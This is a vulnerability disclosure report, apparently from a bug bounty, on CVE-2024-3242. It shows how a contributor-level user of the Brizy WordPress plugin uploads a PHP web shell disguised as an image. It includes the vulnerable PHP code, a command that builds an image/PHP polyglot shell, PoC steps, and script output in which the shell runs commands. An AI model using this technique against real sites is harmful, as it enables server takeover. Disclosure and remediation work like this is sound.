# Post Report Info

- Link: https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/brizy/brizy-page-builder-2444-authenticated-contributor-arbitrary-file-upload
- CVE: 2024-3242
- Bounty: $469

# Brizy – Page Builder Authenticated (Contributor+) Arbitrary File Upload

The Brizy – Page Builder WordPress Plugin is vulnerable to a contributor level authenticated arbitrary file upload when importing a new block by uploading a zip file. There is insufficient file validation, allowing for PHP files to be uploaded providing they are also valid image files.

## Affected Plugin

* **Title**: Brizy – Page Builder
* **Active installations**: 80k
* **Version**: <= 2.4.41
* **Slug**: brizy
* **Link**: https://wordpress.org/plugins/brizy/

## Root Cause

This vulnerability is possible because contributor level users can by default upload zip files that are unpacked to add blocks. These blocks can contain a list of images, that are not properly validated allowing for the upload of arbitrary files including a PHP shell. 

In [editor/zip/archiver.php](https://plugins.trac.wordpress.org/browser/brizy/trunk/editor/zip/archiver.php#L264) in the function `storeImages`, the filename is obtained from the zip file (using basename of the path), this is then used on in `file_put_contents` without checking the file extension, as can be seen in the snippet below:

```php
$basename = basename($path);
$imageContent = $z->getFromName($path);

if (!$this->validateImageContent($basename, $imageContent)) {
    continue;
}

$original_asset_path = $urlBuilder->page_upload_path("/assets/images/".$basename);
$original_asset_path_relative = $urlBuilder->page_upload_relative_path("/assets/images/".$basename);
wp_mkdir_p(dirname($original_asset_path));
file_put_contents($original_asset_path, $imageContent);
```

There is an attempt to protect against this, by validating the image type. In [editor/zip/archiver.php](https://plugins.trac.wordpress.org/browser/brizy/trunk/editor/zip/archiver.php#L547) the function `validateImageContent` is used to ensure that the uploaded file is a valid image file.

```php
private function validateImageContent($name, $content)
{
    $tempName = get_temp_dir().md5($name);
    file_put_contents($tempName, $content);
    $isImage = file_is_valid_image($tempName);
    unlink($tempName);

    return $isImage;
}
```

However, it is trivial to create a valid image file that is also a valid PHP file and because there is no file name check we can create images with `.php` extensions. For example, the following shell command will take a valid image and a valid php file and combine them into a single file that will pass this check (jpg images are valid with junk added to the end, PHP inside exif data would also have worked):

```shell
cat image.jpg code.php > shell.php
```

## Impact

The vulnerability allows any contributor or high-level user to execute arbitrary commands on the host system, leading to a complete breach. This results in a total compromise of the system's confidentiality, integrity, and availability. Such an exploit can grant unauthorized access to sensitive data, alter or delete critical information, and disrupt service operations. The severity of this impact underscores the urgent need for prompt remediation to prevent potential exploitation and to safeguard the system and its data.

## Remediation

- Restrict the file extensions that uploaded images can have. Where possible use built-in WordPress to hand this uploading rather than rolling your own, as they have additional protection already.

## Proof of Concept

1. Install and activate the plugin
2. Modify the provided PoC (`brizy-rce2.py`) with the username/password of a contributor level user. Note that this script will upload the zip file `exploit.zip` which is created by zipping the `uJ4WvfXuHyL8` folder. This folder contains a `data.json` file that contains the block information and `shell.php` a valid image file that is also a shell.
3. Run the PoC script `python3 brizy-rce2.py`. The shell will be uploaded to a path like `/var/www/html/wp-content/uploads/brizy/15/assets/images/shell.php` (the script will try to guess the id (`15` in this example) and the output should look like the following:

```
❯ python3 brizy-rce2.py
[+] Login Successful
[+] Nonce d3afb16f8a
[+] Version 279-wp
[+] Uploading zip
{'success': True, 'data': {'success': [{'uid': '7afa8300d36b7a117644a7640ad072b3', 'status': 'publish', 'dataVersion': 1, 'data': '{"type":"Section","value":{"_styles":["section"],"items":[{"type":"SectionItem","value":{"_styles":["section-item"],"items":[{"type":"Wrapper","value":{"_styles":["wrapper","wrapper--richText"],"items":[{"type":"RichText","value":{"_styles":["richText"],"linkSource":"page","linkType":"page","_id":"tkXfOxljiVdS","_version":2,"text":"<p>Hello text</p>"}}],"_id":"lFEBoDOomnJS"}},{"type":"Cloneable","value":{"_styles":["wrapper-clone","wrapper-clone--button"],"items":[{"type":"Button","value":{"_styles":["button"],"linkSource":"page","linkType":"page","_id":"kOV1swiqlypR"}}],"_id":"krcoXYDy4Ozf"}},{"type":"Wrapper","value":{"_styles":["wrapper","wrapper--embedCode"],"items":[{"type":"EmbedCode","value":{"_styles":["embedCode"],"_id":"wjr3pLVOoJIP","code":"<script>alert(1)</script>"}}],"_id":"rRhh2CSiCwBg"}}],"_id":"xPgvR7WPlXs_","paddingType":"ungrouped","paddingTop":74}},{"type":"SectionItem","value":{"_styles":["section-item"],"items":[{"type":"Wrapper","value":{"_styles":["wrapper","wrapper--richText"],"items":[{"type":"RichText","value":{"_styles":["richText"],"linkSource":"page","linkType":"page","_id":"xk0lPqOgoKMI","_version":2,"text":"<p>Hello text</p>"}}],"_id":"sVZkRKXZqiyW"}},{"type":"Cloneable","value":{"_styles":["wrapper-clone","wrapper-clone--button"],"items":[{"type":"Button","value":{"_styles":["button"],"linkSource":"page","linkType":"page","_id":"myK8i70KJ9NE"}}],"_id":"vvZ2Ti1MfK6L"}}],"_id":"aR0SIYUrmMsJ","paddingType":"ungrouped","paddingTop":74}}],"_id":"cPGOG2fks9Kc","membership":"off","slider":"on"},"blockId":"Kit2Blank000Light","meta":{"_thumbnailSrc":"https://e-t-cloud.b-cdn.net/1.3.3-beta2/kits/thumbs/Kit2Blank000Light.jpg","_thumbnailWidth":600,"_thumbnailHeight":311}}', 'meta': '{"extraFontStyles":[],"type":"normal","_thumbnailSrc":"lwgfgotmlvklzbmkgbqxyszxqrgnongx","_thumbnailWidth":600,"_thumbnailHeight":109,"_thumbnailTime":1706896160571}', 'title': '', 'tags': '', 'author': '4', 'isCloudEntity': False, 'synchronized': False, 'synchronizable': True}], 'errors': []}}
[?] Finding Shell:
[+] Shell: id
└─ uid=33(www-data) gid=33(www-data) groups=33(www-data)
[+] Shell: /wp-content/uploads/brizy/15/assets/images/shell.php?cmd=id
[+] Testing Shell:
[+] Shell: id
└─ uid=33(www-data) gid=33(www-data) groups=33(www-data)
[+] Shell: pwd
└─ /var/www/html/wp-content/uploads/brizy/15/assets/images
```